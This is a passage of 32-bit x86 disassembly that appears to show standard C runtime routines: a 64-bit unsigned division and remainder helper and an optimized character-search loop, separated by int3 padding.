  4289df:	je     0x4289ea
  4289e1:	mov    ecx,0xffffffff
  4289e6:	jb     0x4289ea
  4289e8:	neg    ecx
  4289ea:	mov    eax,ecx
  4289ec:	pop    ebx
  4289ed:	pop    esi
  4289ee:	pop    edi
  4289ef:	leave  
  4289f0:	ret    
  4289f1:	int3   
  4289f2:	int3   
  4289f3:	int3   
  4289f4:	int3   
  4289f5:	int3   
  4289f6:	int3   
  4289f7:	int3   
  4289f8:	int3   
  4289f9:	int3   
  4289fa:	int3   
  4289fb:	int3   
  4289fc:	int3   
  4289fd:	int3   
  4289fe:	int3   
  4289ff:	int3   
  428a00:	push   esi
  428a01:	mov    eax,DWORD PTR [esp+0x14]
  428a05:	or     eax,eax
  428a07:	jne    0x428a31
  428a09:	mov    ecx,DWORD PTR [esp+0x10]
  428a0d:	mov    eax,DWORD PTR [esp+0xc]
  428a11:	xor    edx,edx
  428a13:	div    ecx
  428a15:	mov    ebx,eax
  428a17:	mov    eax,DWORD PTR [esp+0x8]
  428a1b:	div    ecx
  428a1d:	mov    esi,eax
  428a1f:	mov    eax,ebx
  428a21:	mul    DWORD PTR [esp+0x10]
  428a25:	mov    ecx,eax
  428a27:	mov    eax,esi
  428a29:	mul    DWORD PTR [esp+0x10]
  428a2d:	add    edx,ecx
  428a2f:	jmp    0x428a78
  428a31:	mov    ecx,eax
  428a33:	mov    ebx,DWORD PTR [esp+0x10]
  428a37:	mov    edx,DWORD PTR [esp+0xc]
  428a3b:	mov    eax,DWORD PTR [esp+0x8]
  428a3f:	shr    ecx,1
  428a41:	rcr    ebx,1
  428a43:	shr    edx,1
  428a45:	rcr    eax,1
  428a47:	or     ecx,ecx
  428a49:	jne    0x428a3f
  428a4b:	div    ebx
  428a4d:	mov    esi,eax
  428a4f:	mul    DWORD PTR [esp+0x14]
  428a53:	mov    ecx,eax
  428a55:	mov    eax,DWORD PTR [esp+0x10]
  428a59:	mul    esi
  428a5b:	add    edx,ecx
  428a5d:	jb     0x428a6d
  428a5f:	cmp    edx,DWORD PTR [esp+0xc]
  428a63:	ja     0x428a6d
  428a65:	jb     0x428a76
  428a67:	cmp    eax,DWORD PTR [esp+0x8]
  428a6b:	jbe    0x428a76
  428a6d:	dec    esi
  428a6e:	sub    eax,DWORD PTR [esp+0x10]
  428a72:	sbb    edx,DWORD PTR [esp+0x14]
  428a76:	xor    ebx,ebx
  428a78:	sub    eax,DWORD PTR [esp+0x8]
  428a7c:	sbb    edx,DWORD PTR [esp+0xc]
  428a80:	neg    edx
  428a82:	neg    eax
  428a84:	sbb    edx,0x0
  428a87:	mov    ecx,edx
  428a89:	mov    edx,ebx
  428a8b:	mov    ebx,ecx
  428a8d:	mov    ecx,eax
  428a8f:	mov    eax,esi
  428a91:	pop    esi
  428a92:	ret    0x10
  428a95:	int3   
  428a96:	int3   
  428a97:	int3   
  428a98:	int3   
  428a99:	int3   
  428a9a:	int3   
  428a9b:	int3   
  428a9c:	int3   
  428a9d:	int3   
  428a9e:	int3   
  428a9f:	int3   
  428aa0:	lea    eax,[edx-0x1]
  428aa3:	pop    ebx
  428aa4:	ret    
  428aa5:	lea    esp,[esp+0x0]
  428aac:	lea    esp,[esp+0x0]
  428ab0:	xor    eax,eax
  428ab2:	mov    al,BYTE PTR [esp+0x8]
  428ab6:	push   ebx
  428ab7:	mov    ebx,eax
  428ab9:	shl    eax,0x8
  428abc:	mov    edx,DWORD PTR [esp+0x8]
  428ac0:	test   edx,0x3
  428ac6:	je     0x428add
  428ac8:	mov    cl,BYTE PTR [edx]
  428aca:	add    edx,0x1
  428acd:	cmp    cl,bl
  428acf:	je     0x428aa0
  428ad1:	test   cl,cl
  428ad3:	je     0x428b26
  428ad5:	test   edx,0x3
  428adb:	jne    0x428ac8
  428add:	or     ebx,eax
  428adf:	push   edi
  428ae0:	mov    eax,ebx
  428ae2:	shl    ebx,0x10
  428ae5:	push   esi
  428ae6:	or     ebx,eax
  428ae8:	mov    ecx,DWORD PTR [edx]
  428aea:	mov    edi,0x7efefeff
  428aef:	mov    eax,ecx
  428af1:	mov    esi,edi
  428af3:	xor    ecx,ebx
  428af5:	add    esi,eax
  428af7:	add    edi,ecx
  428af9:	xor    ecx,0xffffffff
  428afc:	xor    eax,0xffffffff
  428aff:	xor    ecx,edi
  428b01:	xor    eax,esi
  428b03:	add    edx,0x4
  428b06:	and    ecx,0x81010100
  428b0c:	jne    0x428b2a
  428b0e:	and    eax,0x81010100
  428b13:	je     0x428ae8
  428b15:	and    eax,0x1010100
  428b1a:	jne    0x428b24
  428b1c:	and    esi,0x80000000
  428b22:	jne    0x428ae8
  428b24:	pop    esi
  428b25:	pop    edi
  428b26:	pop    ebx
  428b27:	xor    eax,eax
  428b29:	ret    
  428b2a:	mov    eax,DWORD PTR [edx-0x4]
  428b2d:	cmp    al,bl
  428b2f:	je     0x428b67
  428b31:	test   al,al
  428b33:	je     0x428b24
  428b35:	cmp    ah,bl
  428b37:	je     0x428b60
  428b39:	test   ah,ah
  428b3b:	je     0x428b24
  428b3d:	shr    eax,0x10
  428b40:	cmp    al,bl
  428b42:	je     0x428b59
  428b44:	test   al,al
  428b46:	je     0x428b24
  428b48:	cmp    ah,bl
  428b4a:	je     0x428b52
  428b4c:	test   ah,ah
  428b4e:	je     0x428b24
  428b50:	jmp    0x428ae8
  428b52:	pop    esi
  428b53:	pop    edi
  428b54:	lea    eax,[edx-0x1]
  428b57:	pop    ebx
  428b58:	ret    
  428b59:	lea    eax,[edx-0x2]
  428b5c:	pop    esi
  428b5d:	pop    edi
  428b5e:	pop    ebx
  428b5f:	ret    
  428b60:	lea    eax,[edx-0x3]
  428b63:	pop    esi
  428b64:	pop    edi
  428b65:	pop    ebx
  428b66:	ret    
  428b67:	lea    eax,[edx-0x4]
  428b6a:	pop    esi
  428b6b:	pop    edi
  428b6c:	pop    ebx
  428b6d:	ret    
  428b6e:	jmp    DWORD PTR ds:0x42905c
